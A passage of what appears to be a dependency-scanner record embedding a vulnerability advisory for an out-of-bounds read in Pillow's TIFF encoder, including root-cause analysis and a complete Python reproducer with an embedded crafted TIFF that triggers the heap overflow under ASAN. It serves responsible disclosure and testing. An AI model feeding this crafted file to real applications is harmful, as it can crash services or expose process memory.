 with io.BytesIO() as output:\n                image.save(output, format=\"TIFF\")\n                if case == \"colormap16\":\n                    emit(descriptor, {\"unsafe_save_returned\": True})\n                    return 1\n                encoded = output.getvalue()\n                saved_bits = field(encoded, 258)\n                map_field = field(encoded, 320)\n                bits_preserved = (saved_bits is not None and saved_bits[:2] == (3, 1)\n                                  and struct.unpack(saved_bits[3] + \"H\", saved_bits[2])[0] == bits)\n                map_preserved = (map_field is None if case == \"colormap_absent\"\n                                 else map_field is not None and map_field[:2] == (3, 768)\n                                 and map_field[2] == bytes(1536))\n                emit(descriptor, {\"control_passed\": bool(bits_preserved and map_preserved)})\n        return 0\n    except Exception:\n        emit(descriptor, {\"child_failed\": True})\n        return 2\n    finally:\n        os.close(descriptor)\n\n\ndef run_case(case, package, runtime):\n    with tempfile.TemporaryDirectory(prefix=\"pillow-check-\") as temporary:\n        environment = {\n            \"PATH\": \"/usr/bin:/bin:/usr/sbin:/sbin\",\n            \"HOME\": temporary,\n            \"TMPDIR\": temporary,\n            \"LC_ALL\": \"C\",\n            \"DYLD_INSERT_LIBRARIES\": str(runtime),\n            \"ASAN_OPTIONS\": \"detect_leaks=0:halt_on_error=1:abort_on_error=0:exitcode=86:\"\n                            \"disable_coredump=1:symbolize=1:malloc_fill_byte=165:\"\n                            \"max_malloc_fill_size=1048576:log_path=stderr\",\n        }\n        command = [sys.executable, \"-I\", \"-S\", \"-B\", str(Path(__file__).resolve()),\n                   \"--package-path\", str(package), \"--asan-runtime\", str(runtime), \"--child\", case]\n        output = bytearray()\n        diagnostics = bytearray()\n        deadline = time.monotonic() + WALL_SECONDS\n        with subprocess.Popen(command, cwd=temporary, env=environment, stdin=subprocess.DEVNULL,\n                              stdout=subprocess.PIPE, stderr=subprocess.PIPE,\n                              preexec_fn=limits, start_new_session=True) as process:\n            bounded = True\n            try:\n                with selectors.DefaultSelector() as selector:\n                    selector.register(process.stdout, selectors.EVENT_READ, output)\n                    selector.register(process.stderr, selectors.EVENT_READ, diagnostics)\n                    while selector.get_map():\n                        remaining = deadline - time.monotonic()\n                        if remaining \u003c= 0:\n                            raise TimeoutError\n                        for key, events in selector.select(min(remaining, 0.25)):\n                            chunk = os.read(key.fileobj.fileno(), 8192)\n                            if not chunk:\n                                selector.unregister(key.fileobj)\n                            else:\n                                key.data.extend(chunk)\n                                if len(output) + len(diagnostics) \u003e PIPE_LIMIT:\n                                    raise BufferError\n                    process.wait(timeout=max(0.001, deadline - time.monotonic()))\n            except (TimeoutError, BufferError, subprocess.TimeoutExpired):\n                bounded = False\n                try:\n                    os.killpg(process.pid, 9)\n                except ProcessLookupError:\n                    pass\n                process.wait()\n            status = process.returncode\n        try:\n            messages = [json.loads(line) for line in output.splitlines()]\n        except (ValueError, UnicodeError):\n            messages = []\n        ready = bool(messages and messages[0] == {\"ready\": True})\n        if case == \"colormap16\":\n            observed = bool(bounded and ready and status == 86 and len(messages) == 1\n                            and b\"AddressSanitizer: heap-buffer-overflow\" in diagnostics\n                            and b\"READ of size 131072\" in diagnostics\n                            and b\"0 bytes after 1536-byte region\" in diagnostics\n                            and b\"PyImaging_LibTiffEncoderNew\" in diagnostics\n                            and b\"_TIFFmemcpy\" in diagnostics)\n        else:\n            observed = bool(bounded and ready and status == 0\n                            and messages == [{\"ready\": True}, {\"control_passed\": True}]\n                            and b\"AddressSanitizer:\" not in diagnostics)\n        output.clear()\n        diagnostics.clear()\n        return {\"case\": case, \"expected_observation\": observed, \"guard_passed\": ready,\n                \"within_limits\": bounded}\n\n\ndef main():\n    parser = argparse.ArgumentParser(description='Fixed ColorMap extent mismatch: controls first, ASAN-only trigger.')\n    parser.add_argument(\"--package-path\", required=True, type=Path,\n                        help=\"reviewed existing installation root containing PIL\")\n    parser.add_argument(\"--asan-runtime\", required=True, type=Path,\n                        help=\"reviewed existing compatible ASAN dylib; never loaded late\")\n    parser.add_argument(\"--child\", choices=CASES, help=argparse.SUPPRESS)\n    arguments = parser.parse_args()\n    if arguments.child:\n        limits()\n        return child(arguments.child, arguments.package_path.resolve())\n    try:\n        package = arguments.package_path.resolve(strict=True)\n        runtime = arguments.asan_runtime.resolve(strict=True)\n        if not package.is_dir() or not runtime.is_file():\n            raise ValueError(\"invalid existing paths\")\n        for case in CASES:\n            fixture(case)\n        results = [run_case(case, package, runtime) for case in CASES]\n    except Exception:\n        print(json.dumps({\"setup_failed\": True}))\n        return 2\n    for result in results:\n        print(json.dumps(result, sort_keys=True))\n    return 0 if all(result[\"expected_observation\"] for result in results) else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n```",
                "text": "## Summary\n\nA small attacker-supplied TIFF can be opened and loaded normally, then reach an out-of-bounds read when an application saves it back to TIFF with retained metadata. The fixed reproducer is a 1×1, 16-bit grayscale, PackBits-compressed TIFF containing tag 320 (ColorMap) with **768 SHORT values**: three zero-filled planes of 256 entries each. No Python object is forged and no metadata is injected after loading.\n\nPillow's TIFF encoder allocates **768 × 2 = 1536 bytes**, then passes three plane pointers separated by 256 SHORT entries to libtiff. With `BitsPerSample = 16`, libtiff instead expects **65536 SHORT values per plane** and attempts a **131072-byte read** from a plane pointer. Existing ASAN observations identify a heap-buffer-overflow READ crossing the 1536-byte allocation made in `PyImaging_LibTiffEncoderNew`.\n\nThe malformed ColorMap need not be a valid palette for this grayscale image. The issue is that accepted metadata is forwarded on save without reconciling the fixed plane extent with the effective sample depth. Opening/loading alone is not the demonstrated fault; the encoder path is required.\n\n## Impact and prerequisites\n\nAn application must accept the input, retain the relevant TIFF metadata, and invoke the libtiff-backed TIFF save path. The observed consequence is an out-of-bounds read and ASAN termination. Process-memory exposure during encoding is a potential consequence, **not demonstrated by extracting arbitrary heap contents in this report**. No arbitrary read primitive, full memory-disclosure chain, code execution, address-space bypass, or cross-process effect is claimed.\n\nThe 131072-byte attempted copy is not the number of bytes proven disclosed. This report does not run a synthetic-canary serializer or collect an unsanitized encoded output.\n\n## Tested environment and limits of the evidence\n\nThe existing observations were recorded on August 30, 2026, with **CPython 3.11.8 on macOS ARM64**, using the unmodified official **Pillow 12.3.0** wheel and its bundled **libtiff 4.7.1**:\n\n- Wheel: `pillow-12.3.0-cp311-cp311-macosx_11_0_arm64.whl`\n- Wheel size: `4785266` bytes\n- Wheel SHA-256: `37d6d0a00072fd2948eb22bce7e1475f34569d90c87c59f7a2ec59541b77f7a6`\n- Pillow source revision: `bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d`\n- Bundled libtiff SHA-256: `e8988717b7470394a47d5ccd343130796b24ee70b6d885d3818e0e0b53238be1`\n\nApple's ASAN runtime was injected at process startup. This is **not an ASAN-rebuilt Pillow wheel**; allocation/memcpy interception detects the reported boundary violation, but the wheel's native instructions are not comprehensively instrumented.\n\nOnly this concrete full-package environment is established here. No affected-version range, current development-branch result, or patched release is asserted. Severity is **Unknown**; no CVSS score is proposed.\n\nSeparate earlier evidence reached the original Pillow 8.0.1 encoder constructor compiled as a component against a modern Python/libtiff environment. **That was not a complete Pillow 8.0.1 installation** and does not establish the historical package's full runtime behavior. It is not part of this reproducer or an affected-version range.\n\n## Observed evidence and controls\n\nThe earlier integration harness performed the natural sequence `Image.open(BytesIO(input))`, `image.load()`, then `image.save(BytesIO(), format=\"TIFF\")`, without replacing the image's metadata. Each case was recorded three times:\n\n| Original fixture | Bytes | Recorded result |\n| --- | ---: | --- |\n| `colormap16` | 1685 | Loaded as `I;16`; save terminated with ASAN exit 86, READ of size 131072 crossing a 1536-byte heap region (3/3). |\n| `colormap8` | 1684 | Same fixed ColorMap, but 8-bit samples; save succeeded and retained SHORT/count 768 (3/3). |\n| `colormap_absent` | 137 | Same 16-bit geometry without ColorMap; save succeeded (3/3). |\n\nAddress-free summary of the recorded native diagnostic:\n\n```text\nAddressSanitizer: heap-buffer-overflow\nREAD of size 131072\n0 bytes after 1536-byte region\nCopy path: memcpy -\u003e _TIFFmemcpy -\u003e setByteArray -\u003e _TIFFsetShortArrayExt\n           -\u003e _TIFFVSetField -\u003e TIFFVSetField -\u003e ImagingLibTiffSetField\n           -\u003e PyImaging_LibTiffEncoderNew\nAllocation: calloc -\u003e PyImaging_LibTiffEncoderNew\n```\n\nInput SHA-256 values (also enforced inside the script):\n\n- `colormap16`: `5f38e0ead90b97949fb0c98c63f9c68d00ba9181db6631ecb8927376dcc75f4d`\n- `colormap8`: `fdb26d9135549ed44824901985086c5ee4f06515699ca3291e498c523935405c`\n- `colormap_absent`: `bd54979624f3ffb713342e0458caff9e17c477f940cda2f0960feebfabbc9556`\n\n## Root cause and source references\n\n- [Pillow `src/encode.c`, lines 870–899, pinned revision](https://github.com/python-pillow/Pillow/blob/bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d/src/encode.c#L870): the ColorMap tuple must contain exactly 768 entries; a 1536-byte allocation is passed with a fixed stride of 256. The check does not reconcile that extent with `BitsPerSample`.\n- [Pillow `src/PIL/TiffImagePlugin.py`, lines 1944–1991, pinned revision](https://github.com/python-pillow/Pillow/blob/bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d/src/PIL/TiffImagePlugin.py#L1944): save carries supplied tags into the libtiff encoder and sorts the tags, so sample depth is established before ColorMap.\n- [libtiff `tif_dir.c`, lines 441–448, pinned revision](https://gitlab.com/libtiff/libtiff/-/blob/5fe20d0e9aba49a6a350ed533459d1505203838f/libtiff/tif_dir.c#L441): `TIFFTAG_COLORMAP` computes the per-plane count as `1L \u003c\u003c td-\u003etd_bitspersample` and copies that many SHORTs from each pointer.\n\nThe reported boundary is Pillow's construction of a fixed-sized array for a native API whose required size depends on metadata; this does not establish a standalone libtiff defect for a correctly sized caller buffer.\n\n## Prior art and disclosure scope\n\n[Pillow PR #5148](https://github.com/python-pillow/Pillow/pull/5148), merged December 28, 2020, is related TIFF metadata prior art, but its archived diff replaces a short-lived stack field-name pointer with the persistent literal `\"CustomField\"`. That is a **different field-name-lifetime fix**, not this plane-size mismatch. The reviewed material does not establish an exact prior public report or fix for this root, and **novelty is not asserted**. This specific report remains NOT_SENT; association with other observations is not a prior disclosure of it.\n\n## Reproduction instructions\n\nUse an **already reviewed, existing** installation of the exact wheel above, an existing compatible macOS ARM64 CPython 3.11 interpreter, and an existing compatible Apple ASAN runtime. `--package-path` is the absolute directory containing `PIL`, not the `PIL` directory itself. The script does not install, download, build, patch, or submit anything. It checks selected key package files against the original installation's hashes and checks the loaded package/version; these checks are not a full installation attestation.\n\nSave the complete Python block below as `reproduce.py` and run:\n\n```sh\npython3.11 -I -S -B reproduce.py \\\n  --package-path /absolute/path/to/reviewed/site-packages \\\n  --asan-runtime /absolute/path/to/reviewed/libclang_rt.asan_osx_dynamic.dylib\n```\n\nBoth arguments are required. The runtime must be loaded at child startup, not by late `dlopen`. Each child resolves `__asan_init`, `__asan_address_is_poisoned`, and `__asan_region_is_poisoned` in its actual process symbol table **before importing Pillow or opening a fixture**. Merely setting `DYLD_INSERT_LIBRARIES` is not accepted as proof of ASAN availability. A missing symbol or package mismatch prevents the operation.\n\nEach of the three cases runs once in a separate child with a **30-second wall limit, 10-second hard CPU limit, core dumps disabled, and 1 MiB regular-file-size limit**. The parent supplies a clean allowlisted environment, isolated Python startup (`-I -S -B`), an empty temporary working directory, no stdin, and a 128 KiB combined pipe-output cap. Timeout/output-cap handling kills the child's process group. These limits are containment measures, not a security sandbox. No TIFF is written to disk. Temporary directories are removed; raw diagnostics are never forwarded or persisted.\n\nThe compressed/base64 constants below are the **unchanged original benign TIFF fixtures**, with decompressed size and SHA-256 checks. There are no external fixture dependencies. The standalone script supplied with this description is byte-for-byte the same as this block.\n\n**Separate August 31, 2026 inline validation:** the exact embedded standalone script passed all three fixed cases: one ASan READ of 131,072 bytes crossing a 1,536-byte allocation and two passing controls. Child guards and limits passed, with no timeout. This is additional bounded evidence, separate from earlier runs; no new build, install, full historical chain or older-version integration replay was performed.\n\n## Expected results from the standalone script\n\nCases run in order: `colormap8`, `colormap_absent`, `colormap16`. Every printed line should have `guard_passed: true`, `within_limits: true`, and `expected_observation: true`. The first two require successful saves and the expected retained sample-depth/ColorMap fields. The last requires ASAN exit 86 **and** the specific READ/extent/stack signatures, not merely any crash. Only the two controls inspect encoded metadata; the unsafe case never exports an encoded TIFF.\n\nThe parent exits 0 only if all three expectations match; 1 means a case did not match (including guard failure or a changed ASAN diagnostic), and 2 means parent setup failed. A failed guard, timeout, unrelated crash, or missing diagnostic is **inconclusive**, not evidence that the defect is absent. Do not bypass the ASAN guard to obtain an output TIFF.\n\n## Complete standalone reproducer\n\n```python\nimport argparse\nimport base64\nimport ctypes\nimport hashlib\nimport io\nimport json\nimport os\nfrom pathlib import Path\nimport platform\nimport resource\nimport selectors\nimport struct\nimport subprocess\nimport sys\nimport tempfile\nimport time\nimport zlib\n\n\nFIXTURES = {'colormap8': [1684,\n               'fdb26d9135549ed44824901985086c5ee4f06515699ca3291e498c523935405c',\n               'eNrz9NRi4GBgYOBmYGBkYWAEssAYic3EyAymQaqYoWzWBgYGNigbhAWh6iexMTCIIomLIZkjDmUzAbEMkhoHIJsBiCYxjIJRMApGwSgY2QAAPu0DiA=='],\n 'colormap_absent': [137,\n                     'bd54979624f3ffb713342e0458caff9e17c477f940cda2f0960feebfabbc9556',\n                     'eNrz9NRi4GBgYOBiYGBkYWAEssAYic3EyAymBYCYGcpmbWBgYIOyQVgQqr4NiEWRxMWQzBGHspmBWAZJDQOEBgDj8wKm'],\n 'colormap16': [1685,\n                '5f38e0ead90b97949fb0c98c63f9c68d00ba9181db6631ecb8927376dcc75f4d',\n                'eNrz9NRi4GBgYOBmYGBkYWAEssAYic3EyAymBYCYGcpmbWBgYIOyQVgQqn4SGwODKJK4GJI54lA2MxDLIKlxALJBgpMYRsEoGAWjYBSMZACsEwB78wOS']}\nPACKAGE_PINS = {'PIL/ImageFile.py': '983c4f35e0c51046d4c636998ec77000cd2da208870a03b205e104cd0b2df629',\n 'PIL/_version.py': 'fe7d75d4019326aca24ae57d4ab190cd62ba1225b175051119cd61cd87e42b1d',\n 'PIL/__init__.py': '7361b6ad3878589affe5956e4a4da24d71398b0891fd3a8c15e9362217b4ca01',\n 'PIL/features.py': '14f904863b416914aaa6480735876ec31885b7272ee0d8d92b010c5b1b5e98f5',\n 'PIL/TiffTags.py': '766dea350424b9a2caab3513be794689403c2b7222cd038006f69cff08edb45d',\n 'PIL/TiffImagePlugin.py': '440b2a3a80b280d18cda3fc70d9fd206e2fa44e9897c9550f70b51395047b273',\n 'PIL/_imaging.cpython-311-darwin.so': '6d09b1fb925779fff32b5b8a4c348a42c201d350d0e0fd8cdc00410b6779e596',\n 'PIL/Image.py': '04af3f2db7ffdd61e829fa7aa8f5481d394a0a4129a8fd8aa5b13908928fcd6d',\n 'PIL/.dylibs/libtiff.6.dylib': 'e8988717b7470394a47d5ccd343130796b24ee70b6d885d3818e0e0b53238be1',\n 'pillow-12.3.0.dist-info/WHEEL': 'de2586b77651a8bf1b7778c3609979713ebc901784a837fca80ed4969fc82e57',\n 'pillow-12.3.0.dist-info/METADATA': '8fc07146cab33ef7582361dab6eac596d340b03ec648f18217da7894f73838c8'}\nCASES = tuple(FIXTURES)\nWALL_SECONDS = 30\nFILE_LIMIT = 1024 * 1024\nPIPE_LIMIT = 128 * 1024\n\n\ndef limits():\n    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))\n    resource.setrlimit(resource.RLIMIT_CPU, (10, 10))\n    resource.setrlimit(resource.RLIMIT_FSIZE, (FILE_LIMIT, FILE_LIMIT))\n\n\ndef fixture(case):\n    size, expected_hash, encoded = FIXTURES[case]\n    decoder = zlib.decompressobj()\n    data = decoder.decompress(base64.b64decode(encoded, validate=True), size + 1)\n    if (len(data) != size or not decoder.eof or decoder.unused_data\n            or decoder.unconsumed_tail\n            or hashlib.sha256(data).hexdigest() != expected_hash):\n        raise ValueError(\"fixture integrity check failed\")\n    return data\n\n\ndef field(data, wanted):\n    if len(data) \u003c 8 or data[:4] not in (b\"II*\\0\", b\"MM\\0*\"):\n        raise ValueError(\"not classic TIFF\")\n    endian = \"\u003c\" if data[:2] == b\"II\" else \"\u003e\"\n    directory = struct.unpack_from(endian + \"I\", data, 4)[0]\n    count = struct.unpack_from(endian + \"H\", data, directory)[0]\n    if directory + 2 + count * 12 + 4 \u003e len(data):\n        raise ValueError(\"truncated directory\")\n    for number in range(count):\n        offset = directory + 2 + number * 12\n        tag, kind, length = struct.unpack_from(endian + \"HHI\", data, offset)\n        if tag != wanted:\n            continue\n        size = {1: 1, 2: 1, 3: 2, 4: 4, 7: 1}[kind] * length\n        start = offset + 8 if size \u003c= 4 else struct.unpack_from(endian + \"I\", data, offset + 8)[0]\n        if start + size \u003e len(data):\n            raise ValueError(\"truncated field\")\n        return kind, length, data[start:start + size], endian\n    return None\n\n\ndef checked_image_module(package):\n    if (sys.implementation.name != \"cpython\" or sys.version_info[:2] != (3, 11)\n            or sys.platform != \"darwin\" or platform.machine() != \"arm64\"):\n        raise RuntimeError(\"requires macOS ARM64 CPython 3.11\")\n    for relative, expected in PACKAGE_PINS.items():\n        path = (package / relative).resolve(strict=True)\n        if not path.is_relative_to(package) or hashlib.sha256(path.read_bytes()).hexdigest() != expected:\n            raise RuntimeError(\"reviewed wheel file mismatch\")\n    process_symbols = ctypes.CDLL(None)\n    for symbol in (\"__asan_init\", \"__asan_address_is_poisoned\", \"__asan_region_is_poisoned\"):\n        getattr(process_symbols, symbol)\n    sys.path.insert(0, str(package))\n    from PIL import Image, features\n    if (Image.__version__ != \"12.3.0\" or features.version(\"libtiff\") != \"4.7.1\"\n            or Path(Image.__file__).resolve() != package / \"PIL/Image.py\"\n            or Path(Image.core.__file__).resolve() != package / \"PIL/_imaging.cpython-311-darwin.so\"):\n        raise RuntimeError(\"unexpected Pillow or libtiff\")\n    return Image\n\n\ndef emit(descriptor, message):\n    os.write(descriptor, (json.dumps(message, sort_keys=True) + \"\\n\").encode(\"ascii\"))\n\n\ndef child(case, package):\n    descriptor = os.dup(1)\n    with open(os.devnull, \"wb\") as quiet:\n        os.dup2(quiet.fileno(), 1)\n    try:\n        image_module = checked_image_module(package)\n        data = fixture(case)\n        with image_module.open(io.BytesIO(data)) as image:\n            image.load()\n            if image.size != (1, 1) or image.info.get(\"compression\") != \"packbits\":\n                raise ValueError(\"unexpected input geometry\")\n            bits = 8 if case == \"colormap8\" else 16\n            if image.tag_v2[258] != (bits,):\n                raise ValueError(\"unexpected sample width\")\n            if case == \"colormap_absent\":\n                if 320 in image.tag_v2:\n                    raise ValueError(\"unexpected ColorMap\")\n            elif image.tag_v2[320] != (0,) * 768:\n                raise ValueError(\"unexpected ColorMap planes\")\n            emit(descriptor, {\"ready\": True})\n            with io.BytesIO() as output:\n                image.save(output, format=\"TIFF\")\n                if case == \"colormap16\":\n                    emit(descriptor, {\"unsafe_save_returned\": True})\n                    return 1\n                encoded = output.getvalue()\n                saved_bits = field(encoded, 258)\n                map_field = field(encoded, 320)\n                bits_preserved = (saved_bits is not None and saved_bits[:2] == (3, 1)\n                                  and struct.unpack(saved_bits[3] + \"H\", saved_bits[2])[0] == bits)\n                map_preserved = (map_field is None if case == \"colormap_absent\"\n                                 else map_field is not None and map_field[:2] == (3, 768)\n                                 and map_field[2] == bytes(1536))\n                emit(descriptor, {\"control_passed\": bool(bits_preserved and map_preserved)})\n        return 0\n    except Exception:\n        emit(descriptor, {\"child_failed\": True})\n        return 2\n    finally:\n        os.close(descriptor)\n\n\ndef run_case(case, package, runtime):\n    with tempfile.TemporaryDirectory(prefix=\"pillow-check-\") as temporary:\n        environment = {\n            \"PATH\": \"/usr/bin:/bin:/usr/sbin:/sbin\",\n            \"HOME\": temporary,\n            \"TMPDIR\": temporary,\n            \"LC_ALL\": \"C\",\n            \"DYLD_INSERT_LIBRARIES\": str(runtime),\n            \"ASAN_OPTIONS\": \"detect_leaks=0:halt_on_error=1:abort_on_error=0:exitcode=86:\"\n                            \"disable_coredump=1:symbolize=1:malloc_fill_byte=165:\"\n                            \"max_malloc_fill_size=1048576:log_path=stderr\",\n        }\n        command = [sys.executable, \"-I\", \"-S\", \"-B\", str(Path(__file__).resolve()),\n                   \"--package-path\", str(package), \"--asan-runtime\", str(runtime), \"--child\", case]\n        output = bytearray()\n        diagnostics = bytearray()\n        deadline = time.monotonic() + WALL_SECONDS\n        with subprocess.Popen(command, cwd=temporary, env=environment, stdin=subprocess.DEVNULL,\n                              stdout=subprocess.PIPE, stderr=subprocess.PIPE,\n                              preexec_fn=limits, start_new_session=True) as process:\n            bounded = True\n            try:\n                with selectors.DefaultSelector() as selector:\n                    selector.register(process.stdout, selectors.EVENT_READ, output)\n                    selector.register(process.stderr, selectors.EVENT_READ, diagnostics)\n                    while selector.get_map():\n                        remaining = deadline - time.monotonic()\n                        if remaining \u003c= 0:\n                            raise TimeoutError\n                        for key, events in selector.select(min(remaining, 0.25)):\n                            chunk = os.read(key.fileobj.fileno(), 8192)\n                            if not chunk:\n                                selector.unregister(key.fileobj)\n                            else:\n                                key.data.extend(chunk)\n                                if len(output) + len(diagnostics) \u003e PIPE_LIMIT:\n                                    raise BufferError\n                    process.wait(timeout=max(0.001, deadline - time.monotonic()))\n            except (TimeoutError, BufferError, subprocess.TimeoutExpired):\n                bounded = False\n                try:\n                    os.killpg(process.pid, 9)\n                except ProcessLookupError:\n                    pass\n                process.wait()\n            status = process.returncode\n        try:\n            messages = [json.loads(line) for line in output.splitlines()]\n        except (ValueError, UnicodeError):\n            messages = []\n        ready = bool(messages and messages[0] == {\"ready\": True})\n        if case == \"colormap16\":\n            observed = bool(bounded and ready and status == 86 and len(messages) == 1\n                            and b\"AddressSanitizer: heap-buffer-overflow\" in diagnostics\n                            and b\"READ of size 131072\" in diagnostics\n                            and b\"0 bytes after 1536-byte region\" in diagnostics\n                            and b\"PyImaging_LibTiffEncoderNew\" in diagnostics\n                            and b\"_TIFFmemcpy\" in diagnostics)\n        else:\n            observed = bool(bounded and ready and status == 0\n                            and messages == [{\"ready\": True}, {\"control_passed\": True}]\n                            and b\"AddressSanitizer:\" not in diagnostics)\n        output.clear()\n        diagnostics.clear()\n        return {\"case\": case, \"expected_observation\": observed, \"guard_passed\": ready,\n                \"within_limits\": bounded}\n\n\ndef main():\n    parser = argparse.ArgumentParser(description='Fixed ColorMap extent mismatch: controls first, ASAN-only trigger.')\n    parser.add_argument(\"--package-path\", required=True, type=Path,\n                        help=\"reviewed existing installation root containing PIL\")\n    parser.add_argument(\"--asan-runtime\", required=True, type=Path,\n                        help=\"reviewed existing compatible ASAN dylib; never loaded late\")\n    parser.add_argument(\"--child\", choices=CASES, help=argparse.SUPPRESS)\n    arguments = parser.parse_args()\n    if arguments.child:\n        limits()\n        return child(arguments.child, arguments.package_path.resolve())\n    try:\n        package = arguments.package_path.resolve(strict=True)\n        runtime = arguments.asan_runtime.resolve(strict=True)\n        if not package.is_dir() or not runtime.is_file():\n            raise ValueError(\"invalid existing paths\")\n        for case in CASES:\n            fixture(case)\n        results = [run_case(case, package, runtime) for case in CASES]\n    except Exception:\n        print(json.dumps({\"setup_failed\": True}))\n        return 2\n    for result in results:\n        print(json.dumps(result, sort_keys=True))\n    return 0 if all(result[\"expected_observation\"] for result in results) else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n```"
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-112896](https://osv.dev/CVE-2026-112896)**.\n\n## [GHSA-pchr-8j38-3x4p](https://osv.dev/GHSA-pchr-8j38-3x4p)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e A small attacker-supplied TIFF can be opened and loaded normally, then reach an out-of-bounds read when an application saves it back to TIFF with retained metadata. The fixed reproducer is a 1×1, 16-bit grayscale, PackBits-compressed TIFF containing tag 320 (ColorMap) with **768 SHORT values**: three zero-filled planes of 256 entries each. No Python object is forged and no metadata is injected after loading.\n\u003e \n\u003e Pillow's TIFF encoder allocates **768 × 2 = 1536 bytes**, then passes three plane pointers separated by 256 SHORT entries to libtiff. With `BitsPerSample = 16`, libtiff instead expects **65536 SHORT values per plane** and attempts a **131072-byte read** from a plane pointer. Existing ASAN observations identify a heap-buffer-overflow READ crossing the 1536-byte allocation made in `PyImaging_LibTiffEncoderNew`.\n\u003e \n\u003e The malformed ColorMap need not be a valid palette for this grayscale image. The issue is that accepted metadata is forwarded on save without reconciling the fixed plane extent with the effective sample depth. Opening/loading alone is not the demonstrated fault; the encoder path is required.\n\u003e \n\u003e ## Impact and prerequisites\n\u003e \n\u003e An application must accept the input, retain the relevant TIFF metadata, and invoke the libtiff-backed TIFF save path. The observed consequence is an out-of-bounds read and ASAN termination. Process-memory exposure during encoding is a potential consequence, **not demonstrated by extracting arbitrary heap contents in this report**. No arbitrary read primitive, full memory-disclosure chain, code execution, address-space bypass, or cross-process effect is claimed.\n\u003e \n\u003e The 131072-byte attempted copy is not the number of bytes proven disclosed. This report does not run a synthetic-canary serializer or collect an unsanitized encoded output.\n\u003e \n\u003e ## Tested environment and limits of the evidence\n\u003e \n\u003e The existing observations were recorded on August 30, 2026, with **CPython 3.11.8 on macOS ARM64**, using the unmodified official **Pillow 12.3.0** wheel and its bundled **libtiff 4.7.1**:\n\u003e \n\u003e - Wheel: `pillow-12.3.0-cp311-cp311-macosx_11_0_arm64.whl`\n\u003e - Wheel size: `4785266` bytes\n\u003e - Wheel SHA-256: `37d6d0a00072fd2948eb22bce7e1475f34569d90c87c59f7a2ec59541b77f7a6`\n\u003e - Pillow source revision: `bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d`\n\u003e - Bundled libtiff SHA-256: `e8988717b7470394a47d5ccd343130796b24ee70b6d885d3818e0e0b53238be1`\n\u003e \n\u003e Apple's ASAN runtime was injected at process startup. This is **not an ASAN-rebuilt Pillow wheel**; allocation/memcpy interception detects the reported boundary violation, but the wheel's native instructions are not comprehensively instrumented.\n\u003e \n\u003e Only this concrete full-package environment is established here. No affected-version range, current development-branch result, or patched release is asserted. Severity is **Unknown**; no CVSS score is proposed.\n\u003e \n\u003e Separate earlier evidence reached the original Pillow 8.0.1 encoder constructor compiled as a component against a modern Python/libtiff environment. **That was not a complete Pillow 8.0.1 installation** and does not establish the historical package's full runtime behavior. It is not part of this reproducer or an affected-version range.\n\u003e \n\u003e ## Observed evidence and controls\n\u003e \n\u003e The earlier integration harness performed the natural sequence `Image.open(BytesIO(input))`, `image.load()`, then `image.save(BytesIO(), format=\"TIFF\")`, without replacing the image's metadata. Each case was recorded three times:\n\u003e \n\u003e | Original fixture | Bytes | Recorded result |\n\u003e | --- | ---: | --- |\n\u003e | `colormap16` | 1685 | Loaded as `I;16`; save terminated with ASAN exit 86, READ of size 131072 crossing a 1536-byte heap region (3/3). |\n\u003e | `colormap8` | 1684 | Same fixed ColorMap, but 8-bit samples; save succeeded and retained SHORT/count 768 (3/3). |\n\u003e | `colormap_absent` | 137 | Same 16-bit geometry without ColorMap; save succeeded (3/3). |\n\u003e \n\u003e Address-free summary of the recorded native diagnostic:\n\u003e \n\u003e ```text\n\u003e AddressSanitizer: heap-buffer-overflow\n\u003e READ of size 131072\n\u003e 0 bytes after 1536-byte region\n\u003e Copy path: memcpy -\u003e _TIFFmemcpy -\u003e setByteArray -\u003e _TIFFsetShortArrayExt\n\u003e            -\u003e _TIFFVSetField -\u003e TIFFVSetField -\u003e ImagingLibTiffSetField\n\u003e            -\u003e PyImaging_LibTiffEncoderNew\n\u003e Allocation: calloc -\u003e PyImaging_LibTiffEncoderNew\n\u003e ```\n\u003e \n\u003e Input SHA-256 values (also enforced inside the script):\n\u003e \n\u003e - `colormap16`: `5f38e0ead90b97949fb0c98c63f9c68d00ba9181db6631ecb8927376dcc75f4d`\n\u003e - `colormap8`: `fdb26d9135549ed44824901985086c5ee4f06515699ca3291e498c523935405c`\n\u003e - `colormap_absent`: `bd54979624f3ffb713342e0458caff9e17c477f940cda2f0960feebfabbc9556`\n\u003e \n\u003e ## Root cause and source references\n\u003e \n\u003e - [Pillow `src/encode.c`, lines 870–899, pinned revision](https://github.com/python-pillow/Pillow/blob/bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d/src/encode.c#L870): the ColorMap tuple must contain exactly 768 entries; a 1536-byte allocation is passed with a fixed stride of 256. The check does not reconcile that extent with `BitsPerSample`.\n\u003e - [Pillow `src/PIL/TiffImagePlugin.py`, lines 1944–1991, pinned revision](https://github.com/python-pillow/Pillow/blob/bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d/src/PIL/TiffImagePlugin.py#L1944): save carries supplied tags into the libtiff encoder and sorts the tags, so sample depth is established before ColorMap.\n\u003e - [libtiff `tif_dir.c`, lines 441–448, pinned revision](https://gitlab.com/libtiff/libtiff/-/blob/5fe20d0e9aba49a6a350ed533459d1505203838f/libtiff/tif_dir.c#L441): `TIFFTAG_COLORMAP` computes the per-plane count as `1L \u003c\u003c td-\u003etd_bitspersample` and copies that many SHORTs from each pointer.\n\u003e \n\u003e The reported boundary is Pillow's construction of a fixed-sized array for a native API whose required size depends on metadata; this does not establish a standalone libtiff defect for a correctly sized caller buffer.\n\u003e \n\u003e ## Prior art and disclosure scope\n\u003e \n\u003e [Pillow PR #5148](https://github.com/python-pillow/Pillow/pull/5148), merged December 28, 2020, is related TIFF metadata prior art, but its archived diff replaces a short-lived stack field-name pointer with the persistent literal `\"CustomField\"`. That is a **different field-name-lifetime fix**, not this plane-size mismatch. The reviewed material does not establish an exact prior public report or fix for this root, and **novelty is not asserted**. This specific report remains NOT_SENT; association with other observations is not a prior disclosure of it.\n\u003e \n\u003e ## Reproduction instructions\n\u003e \n\u003e Use an **already reviewed, existing** installation of the 